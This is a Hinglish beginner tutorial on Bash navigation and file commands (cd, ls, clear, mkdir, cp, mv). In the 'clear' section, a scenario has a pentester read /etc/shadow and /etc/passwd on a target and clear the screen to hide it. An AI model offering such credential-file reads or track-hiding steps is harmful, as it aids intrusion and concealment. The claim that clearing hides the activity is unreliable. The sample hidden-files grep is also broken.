# **Bash Shell Scripting: Zero-to-Automation Notes (Module 1)**

---

## **PART 1: THE ABSOLUTE BASICS (Shuruaat)**

---

# **Module 1: Basic Navigation & File Handling**

---

## **Topic 1: Basic Navigation (`pwd`, `cd`, `cd ..`, `cd -`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Basic Navigation** - Terminal mein folders ke beech ghoomna aur apni current location pata karna.

### 2. **Ye Kya Hai? (What is it?)**
Navigation commands woh tools hain jo aapko Linux file system mein ek jagah se doosri jagah jaane mein madad karte hain. Yeh bilkul waise hai jaise aap apne computer mein folders par click karke andar-bahar jaate hain, bas yahan aap commands use karte hain.

**Analogy:** Socho ki Linux file system ek bada building hai. Navigation commands aapki lift aur stairs hain jo aapko different floors (folders) par le jaati hain.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Bina navigation ke aap kuch bhi nahi kar sakte** - Files edit karni hain, scripts run karni hain, sab kuch location par depend karta hai
- ✅ **Automation ke liye foundation** - Scripts mein aapko folders change karne padte hain
- ✅ **Time bachata hai** - Mouse use karne se kaafi faster hai
- ✅ **Remote servers par kaam karne ke liye zaroori** - SSH se connect karne par sirf terminal milta hai

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab aapko kisi specific folder mein jaana ho
- Jab aapko pata karna ho ki aap abhi kahan hain
- Jab aapko pichle folder mein wapas jaana ho
- Scripts likhte waqt jab aapko working directory change karni ho

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Aap galat folder mein files delete kar sakte hain (bahut khatarnak!)
- Scripts fail ho jayengi kyunki files mil nahi paayengi
- Commands galat jagah execute hongi
- Confusion aur time waste hoga

### 6. **Syntax aur Common Options**

```bash
# Current directory pata karna
pwd

# Directory change karna
cd <folder_ka_path>

# Ek folder peeche jaana
cd ..

# Pichle folder mein wapas jaana
cd -

# Home directory mein jaana
cd ~
# ya sirf
cd
```

**Important Options:**
- `pwd` - Present Working Directory (koi option nahi hai)
- `cd` - Change Directory
- `cd ..` - Parent directory (ek level upar)
- `cd -` - Previous directory (jahan aap pehle the)

### 7. **Example 1 (Basic)**

```bash
# Pehle dekho aap kahan hain
$ pwd
/home/satish

# Desktop folder mein jao
$ cd Desktop
$ pwd
/home/satish/Desktop

# Ek folder peeche jao
$ cd ..
$ pwd
/home/satish
```

**Output Explanation:** Pehle aap `/home/satish` mein the, phir Desktop mein gaye, phir wapas parent folder mein aa gaye.

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Backup script jo multiple folders mein jaati hai

echo "Current location: $(pwd)"

# Documents folder mein jao
cd ~/Documents
echo "Moved to: $(pwd)"

# Backup folder banao
mkdir -p backup_$(date +%Y%m%d)

# Pichli location par wapas jao
cd -
echo "Back to: $(pwd)"
```

**Output:**
```
Current location: /home/satish
Moved to: /home/satish/Documents
/home/satish
Back to: /home/satish
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Space dena:** `cd My Folder` (galat) → `cd "My Folder"` (sahi)
- ❌ **Absolute vs Relative path confuse karna:** `/home/user/Desktop` (absolute) vs `Desktop` (relative)
- ❌ **Case sensitivity bhoolna:** Linux mein `Desktop` aur `desktop` alag hain

### 10. **Best Practices / Pro Tips**
- 💡 **Tab completion use karo:** `cd Des` type karke Tab dabao, automatically `Desktop` ban jayega
- 💡 **`cd -` bahut useful hai:** Do folders ke beech switch karne ke liye
- 💡 **Hamesha `pwd` se confirm karo:** Khaaskar important commands se pehle

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Maan lo aap ek web developer hain aur aapko apni website ke log files check karni hain jo `/var/log/apache2/` mein hain. Phir aapko website ke code mein changes karne hain jo `/var/www/html/` mein hai. Aap aise karenge:

```bash
cd /var/log/apache2/
tail -f access.log    # Logs dekho
cd -                  # Pichli location par jao
cd /var/www/html/
nano index.html       # Code edit karo
cd -                  # Wapas logs folder mein
```

Yeh workflow bahut common hai system administrators ke liye.

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `pwd` - Apni current location hamesha pata rakho
- ✅ `cd <path>` - Kisi bhi folder mein jaane ke liye
- ✅ `cd ..` - Ek folder peeche jaane ke liye
- ✅ `cd -` - Toggle karne ke liye do folders ke beech
- ✅ Tab key use karo auto-completion ke liye

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `cd` aur `cd ~` mein kya fark hai?**
A: Dono same kaam karte hain - aapko home directory mein le jaate hain. `~` (tilde) home directory ka shortcut hai.

**Q2: Agar folder ka naam mein space hai toh kya karu?**
A: Quotes use karo: `cd "My Documents"` ya backslash: `cd My\ Documents`

**Q3: `cd -` kaise kaam karta hai?**
A: Yeh ek internal variable `$OLDPWD` use karta hai jo aapki previous directory store karta hai.

### 14. **Practice ke liye Task**

Yeh commands try karo:
```bash
# 1. Apni home directory mein jao
cd ~

# 2. Ek test folder banao aur usme jao
mkdir test_navigation
cd test_navigation

# 3. Andar ek aur folder banao
mkdir inner_folder
cd inner_folder

# 4. Ab do baar peeche jao
cd ..
cd ..

# 5. Wapas test_navigation mein jao aur phir cd - use karo
cd test_navigation
cd -
```

### 15. **Aakhri Choti Summary (5 lines)**
- 📍 `pwd` se hamesha pata karo ki aap kahan hain
- 📂 `cd` command se folders ke beech move karo
- ⬆️ `cd ..` parent directory ke liye, `cd -` previous directory ke liye
- 🏠 `cd` ya `cd ~` home directory ke liye shortcut
- ⚡ Tab completion aur quotes ka use karke time bachao

> **💡 Ye Zaroor Yaad Rakhein:**
> Navigation Linux ka sabse basic skill hai. Agar yeh clear nahi hai toh aage ki har cheez mushkil hogi. Practice karo jab tak yeh muscle memory na ban jaaye!

---

## **Topic 2: Listing Files (`ls`, `ls -a`, `ls <folder>`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Listing Files** - Kisi folder mein kya-kya hai, yeh dekhne ka tarika.

### 2. **Ye Kya Hai? (What is it?)**
`ls` command (list ka short form) aapko current folder ya kisi specific folder ke andar ki saari files aur folders ki list dikhata hai. Yeh Windows ke File Explorer mein files dekhne jaisa hai, bas terminal mein.

**Analogy:** Socho ki aap ek library mein hain. `ls` command woh librarian hai jo aapko shelf par rakhi saari books ki list de deta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Files ka pata lagana** - Kaunsi files hain, kaunsi nahi
- ✅ **Hidden files dekhna** - System files jo normally nahi dikhti
- ✅ **File details check karna** - Size, permissions, modification date
- ✅ **Scripts mein automation** - Files ko process karne se pehle unka pata lagana

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab aapko folder ka content dekhna ho
- Jab aapko kisi specific file ko dhoondhna ho
- Jab aapko file permissions check karni hon
- Scripts mein jab aapko files ki list chahiye

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Aapko pata nahi chalega ki folder mein kya hai
- Hidden configuration files miss ho jayengi
- File permissions ki wajah se hone wali problems samajh nahi aayengi
- Automation scripts mein files ka pata nahi chal payega

### 6. **Syntax aur Common Options**

```bash
# Basic listing
ls

# Hidden files ke saath
ls -a

# Long format (detailed)
ls -l

# Human readable sizes
ls -lh

# Specific folder ki listing
ls /path/to/folder

# Sorted by time
ls -lt

# Reverse order
ls -r
```

**Important Options:**
- `-a` : All files (hidden files bhi)
- `-l` : Long format (permissions, size, date)
- `-h` : Human readable (KB, MB, GB mein size)
- `-t` : Time se sort karo (newest pehle)
- `-r` : Reverse order

### 7. **Example 1 (Basic)**

```bash
$ ls
Desktop  Documents  Downloads  Pictures  Videos

$ ls -a
.  ..  .bashrc  .profile  Desktop  Documents  Downloads

$ ls Desktop
project1  notes.txt  script.sh
```

**Output Explanation:** 
- Pehli command ne sirf visible folders dikhaaye
- `-a` se hidden files (jo `.` se shuru hoti hain) bhi dikhi
- Last mein Desktop folder ke andar kya hai woh dekha

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Files ko size ke hisaab se list karna

echo "=== Top 5 Badi Files ==="
ls -lhS | head -6

echo -e "\n=== Aaj Modify Hui Files ==="
ls -lt | grep "$(date +%b\ %d)"

echo -e "\n=== Hidden Configuration Files ==="
ls -la | grep "^\."
```

**Output:**
```
=== Top 5 Badi Files ===
-rw-r--r-- 1 user user 150M Jan 15 10:30 video.mp4
-rw-r--r-- 1 user user  45M Jan 14 09:20 backup.tar.gz

=== Aaj Modify Hui Files ===
-rw-r--r-- 1 user user 1.2K Jan 15 14:30 script.sh

=== Hidden Configuration Files ===
-rw-r--r-- 1 user user  220 Jan 10 .bashrc
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`ls -l` ka output samajh nahi aata:** Permissions, owner, size sab confusing lagte hain
- ❌ **Hidden files bhool jaana:** `.bashrc`, `.ssh` jaise important files miss ho jaati hain
- ❌ **Wildcards galat use karna:** `ls *.txt` sahi, `ls .txt` galat

### 10. **Best Practices / Pro Tips**
- 💡 **Alias banao:** `alias ll='ls -lah'` - ek shortcut jo detailed listing de
- 💡 **Color output:** `ls --color=auto` - files aur folders alag colors mein
- 💡 **Combine karo:** `ls -lhtr` - size, time, reverse order sab ek saath

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap ek system administrator hain aur aapko `/var/log/` folder mein sabse badi log files dhoondhni hain jo disk space kha rahi hain. Aap yeh karenge:

```bash
cd /var/log/
ls -lhS | head -10
# Output: Sabse badi files pehle dikhegi

# Purani files jo delete ki ja sakti hain
ls -lt | tail -20
# Output: Sabse purani files last mein
```

Yeh daily maintenance task hai jo har admin karta hai.

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `ls` - Basic file listing
- ✅ `ls -a` - Hidden files bhi dikhaao
- ✅ `ls -l` - Detailed information
- ✅ `ls -lh` - Human readable sizes
- ✅ `ls -lt` - Time se sort karo

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `.` aur `..` kya hain jo `ls -a` mein dikhte hain?**
A: `.` matlab current directory, `..` matlab parent directory. Yeh har folder mein hote hain.

**Q2: `ls -l` ke output mein pehla column kya hai?**
A: Woh file permissions hain. Jaise `-rw-r--r--` matlab readable/writable/executable permissions.

**Q3: Kya main sirf specific type ki files dekh sakta hoon?**
A: Haan! `ls *.txt` sirf text files, `ls *.sh` sirf shell scripts.

### 14. **Practice ke liye Task**

```bash
# 1. Apne home folder ki saari files dekho (hidden bhi)
ls -la ~

# 2. Sabse badi 5 files dhoodho
ls -lhS ~ | head -6

# 3. Aaj modify hui files dekho
ls -lt ~ | head -10

# 4. Sirf .txt files dekho
ls ~/*.txt

# 5. Desktop folder ki files bina cd kiye dekho
ls ~/Desktop
```

### 15. **Aakhri Choti Summary (5 lines)**
- 📋 `ls` folder ka content dikhata hai
- 👁️ `-a` flag se hidden files bhi dikhengi
- 📊 `-l` detailed information deta hai (size, date, permissions)
- 🎯 Specific folder ki listing: `ls /path/to/folder`
- 🔧 Options combine karo: `ls -lah` sabse useful hai

> **💡 Ye Zaroor Yaad Rakhein:**
> `ls -lah` yaad rakho - yeh sabse useful combination hai jo aapko files ki poori jaankari deta hai human readable format mein!

---

## **Topic 3: Terminal Control (`clear` / `Ctrl + L`, `reset`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Terminal Control** - Terminal screen ko saaf karna aur reset karna.

### 2. **Ye Kya Hai? (What is it?)**
Jab aap terminal mein bahut saare commands chala lete hain toh screen bheed-bhaad wali lag sakti hai. `clear` aur `reset` commands aapki screen ko saaf karke fresh start dete hain.

**Analogy:** Socho ki aapka whiteboard bahut saare notes se bhar gaya hai. `clear` ek duster hai jo board ko saaf kar deta hai taaki aap naye notes likh sako.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Screen clutter kam karna** - Saaf screen par kaam karna aasan hai
- ✅ **Focus improve karna** - Purane output se distraction nahi hota
- ✅ **Screenshots lene se pehle** - Professional dikhne ke liye
- ✅ **Terminal hang hone par** - `reset` terminal ko theek kar sakta hai

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab screen bahut saare outputs se bhar gayi ho
- Jab aapko fresh start chahiye
- Jab terminal ki formatting kharab ho gayi ho
- Demo ya presentation se pehle

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Screen messy rahegi aur kaam karna mushkil hoga
- Important output purane outputs mein kho jayega
- Terminal hang hone par aapko pata nahi chalega kaise fix karna hai
- Productivity kam hogi

### 6. **Syntax aur Common Options**

```bash
# Screen clear karna (scrollback history rahegi)
clear

# Keyboard shortcut (same as clear)
Ctrl + L

# Terminal ko completely reset karna
reset

# Screen clear + cursor top par
tput clear
```

**Difference:**
- `clear` - Sirf visible screen saaf karta hai, scroll up karke purana output dekh sakte hain
- `reset` - Terminal ko completely reinitialize karta hai, formatting bhi theek ho jaati hai

### 7. **Example 1 (Basic)**

```bash
$ ls
file1 file2 file3
$ pwd
/home/user
$ date
Mon Jan 15 10:30:00 IST 2024

# Ab screen bheed-bhaad wali lag rahi hai
$ clear
# Screen saaf ho gayi!

$ ls
file1 file2 file3
# Sirf yeh dikha, baaki sab upar scroll ho gaya
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Interactive menu script

while true; do
    clear  # Har iteration par screen saaf karo
    echo "================================"
    echo "   SYSTEM MANAGEMENT MENU"
    echo "================================"
    echo "1. Check Disk Space"
    echo "2. Check Memory"
    echo "3. List Users"
    echo "4. Exit"
    echo "================================"
    read -p "Enter choice [1-4]: " choice
    
    case $choice in
        1) df -h; read -p "Press Enter to continue..." ;;
        2) free -h; read -p "Press Enter to continue..." ;;
        3) who; read -p "Press Enter to continue..." ;;
        4) clear; exit 0 ;;
        *) echo "Invalid choice!"; sleep 2 ;;
    esac
done
```

**Output:** Har baar menu select karne par screen clear hoke naya menu dikhega.

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`clear` aur `reset` ko same samajhna:** `reset` zyada powerful hai
- ❌ **Important output clear karne se pehle save na karna:** Ek baar clear kiya toh wapas nahi aa sakta (agar `reset` use kiya)
- ❌ **Ctrl+C aur Ctrl+L confuse karna:** Ctrl+C command ko stop karta hai, Ctrl+L screen clear karta hai

### 10. **Best Practices / Pro Tips**
- 💡 **Ctrl+L use karo:** `clear` type karne se faster hai
- 💡 **Scripts mein `clear` use karo:** User experience better hota hai
- 💡 **`reset` sirf emergency mein:** Jab terminal ka behavior weird ho jaye
- 💡 **Scroll up karo:** `clear` ke baad bhi Shift+PgUp se purana output dekh sakte hain

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap ek pentester hain aur aap target system par commands chala rahe hain. Aapko apne tracks hide karne hain aur screen ko clean rakhna hai taaki koi aur dekhe toh suspicious na lage:

```bash
# Sensitive commands chalayi
cat /etc/passwd
cat /etc/shadow
netstat -tulpn

# Ab screen clear karo
clear

# Normal commands dikhaao
ls
pwd
# Kisi ko pata nahi chalega ki aapne sensitive commands chalayi thi
```

Yeh operational security (OpSec) ka part hai.

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `clear` - Screen ko saaf karo (scrollback rahega)
- ✅ `Ctrl + L` - Same as clear, but faster
- ✅ `reset` - Terminal ko completely reset karo
- ✅ Scripts mein `clear` use karo better UX ke liye
- ✅ Scroll up karke purana output dekh sakte hain

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `clear` ke baad purana output kahan jaata hai?**
A: Woh delete nahi hota, sirf screen ke upar scroll ho jaata hai. Shift+PgUp se dekh sakte hain.

**Q2: Kab `reset` use karna chahiye?**
A: Jab terminal ka text garbled (kharab) ho jaye, ya colors theek se na dikhen, ya terminal hang ho jaye.

**Q3: Kya `clear` command history ko bhi delete karta hai?**
A: Nahi! Command history (`history` command se dekh sakte hain) alag cheez hai. Woh `.bash_history` file mein save hoti hai.

### 14. **Practice ke liye Task**

```bash
# 1. Kuch commands chalao
ls
pwd
date
whoami

# 2. Ab clear karo
clear

# 3. Scroll up karo (Shift + PgUp) aur dekho purana output
# Shift + PgUp

# 4. Ctrl+L try karo
# Ctrl + L

# 5. Agar terminal weird behave kare toh reset try karo
reset
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🧹 `clear` screen ko saaf karta hai, output delete nahi hota
- ⌨️ `Ctrl + L` keyboard shortcut hai `clear` ka
- 🔄 `reset` terminal ko completely reinitialize karta hai
- 📜 Scroll up karke purana output dekh sakte hain
- 🎯 Scripts mein `clear` use karo clean interface ke liye

> **💡 Ye Zaroor Yaad Rakhein:**
> `Ctrl + L` sabse fast tarika hai screen clear karne ka. Yeh muscle memory bana lo - bahut kaam aayega!

---

*[Module 1 continues with remaining topics...]*

---

**Next Topics in Module 1:**
- Topic 4: Creating Files & Folders
- Topic 5: Copying Files & Folders
- Topic 6: Moving & Renaming
- Topic 7: Deleting Files & Folders
- Topic 8: File Type & Help

---

**📝 Note:** Yeh notes beginner se intermediate level ke liye hain. Har topic ko 15-point format mein explain kiya gaya hai with practical examples aur real-world scenarios.

## **Topic 4: Creating Files & Folders (`touch`, `mkdir`, `mkdir -p`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Creating Files & Folders** - Nayi files aur folders banana terminal se.

### 2. **Ye Kya Hai? (What is it?)**
`touch` command khali files banata hai aur `mkdir` command folders (directories) banata hai. Yeh Windows mein right-click karke "New File" ya "New Folder" select karne jaisa hai.

**Analogy:** Socho ki aap ek carpenter hain. `touch` aur `mkdir` aapke tools hain jo naye boxes (folders) aur labels (files) banate hain.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Project structure banana** - Naye projects ke liye folders organize karna
- ✅ **Placeholder files** - Baad mein edit karne ke liye khali files
- ✅ **Automation** - Scripts mein dynamically files/folders create karna
- ✅ **Testing** - Test files banake commands practice karna

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Naya project shuru karte waqt
- Log files ya config files ke liye placeholders chahiye
- Backup folders organize karne ke liye
- Scripts mein temporary files/folders chahiye

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Manually files banane mein time waste hoga
- Scripts mein file creation fail hogi
- Project structure messy rahega
- Automation impossible ho jayega

### 6. **Syntax aur Common Options**

```bash
# Ek file banana
touch filename.txt

# Multiple files ek saath
touch file1.txt file2.txt file3.txt

# Ek folder banana
mkdir foldername

# Multiple folders ek saath
mkdir folder1 folder2 folder3

# Nested folders (parent + child)
mkdir -p parent/child/grandchild
```

**Important Options:**
- `touch` - File banata hai, agar exist karti hai toh timestamp update karta hai
- `mkdir` - Directory banata hai
- `mkdir -p` - Parent directories bhi bana deta hai agar nahi hain

### 7. **Example 1 (Basic)**

```bash
# Files banana
$ touch notes.txt
$ touch script.sh config.ini

# Folders banana
$ mkdir projects
$ mkdir docs backups temp

# Verify karo
$ ls
backups  config.ini  docs  notes.txt  projects  script.sh  temp
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Project structure automatically banana

PROJECT_NAME="my_website"

# Main project folder
mkdir -p "$PROJECT_NAME"/{css,js,images,docs}

# Files banana
touch "$PROJECT_NAME"/index.html
touch "$PROJECT_NAME"/css/style.css
touch "$PROJECT_NAME"/js/script.js
touch "$PROJECT_NAME"/docs/README.md

echo "Project structure created!"
tree "$PROJECT_NAME"
```

**Output:**
```
my_website/
├── css/
│   └── style.css
├── docs/
│   └── README.md
├── images/
├── index.html
└── js/
    └── script.js
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Space wale names:** `mkdir My Folder` fail hoga → `mkdir "My Folder"` sahi
- ❌ **`mkdir -p` bhoolna:** Nested folders banate waqt error aayega
- ❌ **Existing files overwrite:** `touch` existing file ko delete nahi karta, sirf timestamp update karta hai

### 10. **Best Practices / Pro Tips**
- 💡 **Brace expansion use karo:** `mkdir project/{src,test,docs}` - ek line mein multiple folders
- 💡 **Naming convention:** Spaces se bacho, underscore ya dash use karo: `my_project` ya `my-project`
- 💡 **`mkdir -p` hamesha safe hai:** Agar folder exist karta hai toh error nahi deta

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap ek developer hain aur har din ek naya log folder banana hai date ke saath:

```bash
#!/bin/bash
# Daily log folder banana

LOG_DIR="/var/logs/app_logs"
TODAY=$(date +%Y-%m-%d)

mkdir -p "$LOG_DIR/$TODAY"
touch "$LOG_DIR/$TODAY/app.log"
touch "$LOG_DIR/$TODAY/error.log"

echo "Log folder created: $LOG_DIR/$TODAY"
```

Yeh script cron job mein daal do, har din automatically folder ban jayega.

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `touch file.txt` - Nayi file banana
- ✅ `mkdir folder` - Naya folder banana
- ✅ `mkdir -p parent/child` - Nested folders banana
- ✅ Multiple files/folders ek saath: space se separate karo
- ✅ Quotes use karo agar naam mein space hai

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: `touch` existing file par kya karta hai?**
A: File ko delete nahi karta, sirf uska modification timestamp update kar deta hai. Content same rahta hai.

**Q2: `mkdir` aur `mkdir -p` mein kya fark hai?**
A: `mkdir` sirf ek level ka folder banata hai. Agar parent folder nahi hai toh error dega. `mkdir -p` saare missing parent folders bhi bana deta hai.

**Q3: Kya main ek saath files aur folders bana sakta hoon?**
A: Nahi directly. Pehle `mkdir` se folders banao, phir `touch` se files.

### 14. **Practice ke liye Task**

```bash
# 1. Test folder banao
mkdir test_creation

# 2. Usme 5 files banao
cd test_creation
touch file1.txt file2.txt file3.txt file4.txt file5.txt

# 3. Nested structure banao
mkdir -p projects/web/frontend
mkdir -p projects/web/backend
mkdir -p projects/mobile/android

# 4. Har folder mein ek README file
touch projects/web/frontend/README.md
touch projects/web/backend/README.md
touch projects/mobile/android/README.md

# 5. Structure dekho
tree projects
```

### 15. **Aakhri Choti Summary (5 lines)**
- 📄 `touch` se files banao (khali ya timestamp update)
- 📁 `mkdir` se folders banao
- 🌳 `mkdir -p` se nested structure banao (parent + child)
- 🎯 Multiple items ek saath: space se separate karo
- 💡 Brace expansion: `mkdir folder/{a,b,c}` - shortcut hai

> **💡 Ye Zaroor Yaad Rakhein:**
> `mkdir -p` yaad rakho - yeh sabse safe option hai. Agar folder already exist karta hai toh error nahi deta, aur missing parents bhi bana deta hai!

---

## **Topic 5: Copying Files & Folders (`cp`, `cp -v`, `cp -r`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Copying Files & Folders** - Files aur folders ko ek jagah se doosri jagah copy karna.

### 2. **Ye Kya Hai? (What is it?)**
`cp` command (copy ka short form) files aur folders ko duplicate karta hai. Original file apni jagah rahti hai, aur ek nayi copy destination par ban jaati hai.

**Analogy:** Socho ki aap ek document ka photocopy kar rahe hain. Original aapke paas rahta hai, aur ek duplicate copy bhi mil jaati hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Backup banana** - Important files ki safety copy
- ✅ **Files share karna** - Ek location se doosri location par
- ✅ **Templates use karna** - Base file copy karke modify karna
- ✅ **Testing** - Original file safe rakhke copy par experiment karna

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Backup lene se pehle
- Configuration files modify karne se pehle (pehle backup copy)
- Files ko USB drive ya network location par transfer karna
- Project templates se naye projects banana

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Backup nahi hogi toh data loss ka risk
- Original file modify karne par wapas nahi aa sakti
- Team members ke saath files share nahi kar paoge
- Automation scripts mein file distribution fail hoga

### 6. **Syntax aur Common Options**

```bash
# Basic copy
cp source.txt destination.txt

# Copy with verbose (progress dikhao)
cp -v source.txt destination.txt

# Copy folder (recursive)
cp -r folder1 folder2

# Multiple files ek folder mein
cp file1.txt file2.txt file3.txt /destination/folder/

# Interactive (overwrite se pehle confirm)
cp -i source.txt destination.txt

# Preserve attributes (permissions, timestamps)
cp -p source.txt destination.txt
```

**Important Options:**
- `-v` : Verbose (kya ho raha hai dikhao)
- `-r` : Recursive (folders ke liye zaroori)
- `-i` : Interactive (overwrite se pehle poocho)
- `-p` : Preserve (permissions aur timestamps same rakho)
- `-u` : Update (sirf newer files copy karo)

### 7. **Example 1 (Basic)**

```bash
# File copy
$ cp notes.txt notes_backup.txt
$ ls
notes.txt  notes_backup.txt

# Folder copy
$ cp -r projects projects_backup
$ ls
projects/  projects_backup/

# Multiple files
$ cp file1.txt file2.txt file3.txt backup_folder/
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# Smart backup script with date

SOURCE="/home/user/important_docs"
BACKUP_DIR="/home/user/backups"
DATE=$(date +%Y%m%d_%H%M%S)

# Backup folder banana
mkdir -p "$BACKUP_DIR/backup_$DATE"

# Copy with verbose
echo "Creating backup..."
cp -rv "$SOURCE"/* "$BACKUP_DIR/backup_$DATE/"

# Summary
FILE_COUNT=$(ls -1 "$BACKUP_DIR/backup_$DATE" | wc -l)
echo "Backup complete! $FILE_COUNT files copied."
```

**Output:**
```
Creating backup...
'important_docs/file1.txt' -> 'backups/backup_20240115_143022/file1.txt'
'important_docs/file2.txt' -> 'backups/backup_20240115_143022/file2.txt'
Backup complete! 2 files copied.
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Folder copy mein `-r` bhoolna:** Error aayega "omitting directory"
- ❌ **Destination path galat:** Agar destination folder exist nahi karta, toh file us naam se ban jayegi
- ❌ **Overwrite warning ignore karna:** Bina `-i` ke important files overwrite ho sakti hain

### 10. **Best Practices / Pro Tips**
- 💡 **Hamesha `-v` use karo:** Pata chalega kya copy ho raha hai
- 💡 **Important files ke liye `-i` use karo:** Accidental overwrite se bachega
- 💡 **Backup ke liye `-p` use karo:** Original permissions aur dates preserve honge
- 💡 **Wildcards use karo:** `cp *.txt backup/` - saari txt files ek saath

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap ek sysadmin hain aur server par configuration file modify karni hai. Pehle backup lena zaroori hai:

```bash
# Apache config backup
sudo cp -p /etc/apache2/apache2.conf /etc/apache2/apache2.conf.backup

# Ab safely edit karo
sudo nano /etc/apache2/apache2.conf

# Agar kuch galat ho jaye, restore karo
# sudo cp /etc/apache2/apache2.conf.backup /etc/apache2/apache2.conf
```

Yeh standard practice hai production servers par.

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `cp source dest` - Basic file copy
- ✅ `cp -v` - Verbose output (progress dekho)
- ✅ `cp -r` - Folders copy karne ke liye (recursive)
- ✅ `cp -i` - Interactive (overwrite confirm karo)
- ✅ `cp -p` - Permissions preserve karo

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Agar destination file already exist karti hai toh kya hoga?**
A: By default overwrite ho jayegi bina warning ke. `-i` option use karo confirmation ke liye.

**Q2: `cp -r` aur `cp -R` mein kya fark hai?**
A: Koi fark nahi, dono same hain. `-r` aur `-R` dono recursive copy karte hain.

**Q3: Kya main copy karte waqt file ka naam change kar sakta hoon?**
A: Haan! `cp old_name.txt new_name.txt` - copy bhi hogi aur rename bhi.

### 14. **Practice ke liye Task**

```bash
# 1. Test files banao
touch original.txt
echo "This is original content" > original.txt

# 2. Simple copy
cp original.txt copy1.txt

# 3. Verbose copy
cp -v original.txt copy2.txt

# 4. Folder structure banao aur copy karo
mkdir source_folder
touch source_folder/file{1..5}.txt
cp -rv source_folder dest_folder

# 5. Multiple files copy
mkdir backup
cp copy1.txt copy2.txt original.txt backup/
ls backup/
```

### 15. **Aakhri Choti Summary (5 lines)**
- 📋 `cp` files aur folders ko duplicate karta hai
- 👁️ `-v` option se progress dikhta hai
- 📁 `-r` folders ke liye mandatory hai
- 🛡️ `-i` accidental overwrite se bachata hai
- ⚙️ `-p` permissions aur timestamps preserve karta hai

> **💡 Ye Zaroor Yaad Rakhein:**
> Important files modify karne se pehle HAMESHA backup lo: `cp -p original.conf original.conf.backup` - yeh aadat bana lo!

---

## **Topic 6: Moving & Renaming (`mv`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Moving & Renaming** - Files aur folders ko move karna ya unka naam change karna.

### 2. **Ye Kya Hai? (What is it?)**
`mv` command (move ka short form) do kaam karta hai: files/folders ko ek jagah se doosri jagah move karna, ya unka naam change karna. Copy ki tarah nahi - original location se file hat jaati hai.

**Analogy:** Socho ki aap apne ghar mein furniture shift kar rahe hain. Ek room se doosre room mein le jaana (move) ya uska naam change karna (rename) - dono same command se hota hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **File organization** - Files ko sahi folders mein arrange karna
- ✅ **Renaming** - Files ka naam meaningful banana
- ✅ **Disk space management** - Files ko different partitions par move karna
- ✅ **Cleanup** - Temporary files ko proper location par move karna

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Files ka naam change karna ho
- Files ko organize karke proper folders mein rakhna ho
- Downloads folder se files ko permanent location par move karna ho
- Typo fix karna ho file names mein

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Files disorganized rahenge
- Wrong names se confusion hoga
- Disk space ek hi partition par waste hoga
- Manual cut-paste se time waste hoga

### 6. **Syntax aur Common Options**

```bash
# File move karna
mv source.txt /destination/folder/

# File rename karna
mv old_name.txt new_name.txt

# Folder move karna (no -r needed!)
mv folder1 /destination/

# Folder rename karna
mv old_folder new_folder

# Multiple files move
mv file1.txt file2.txt file3.txt /destination/

# Interactive mode
mv -i source.txt destination.txt

# Verbose mode
mv -v source.txt destination.txt
```

**Important Options:**
- `-i` : Interactive (overwrite se pehle confirm)
- `-v` : Verbose (kya ho raha hai dikhao)
- `-n` : No clobber (existing files overwrite mat karo)
- `-u` : Update (sirf newer files move karo)

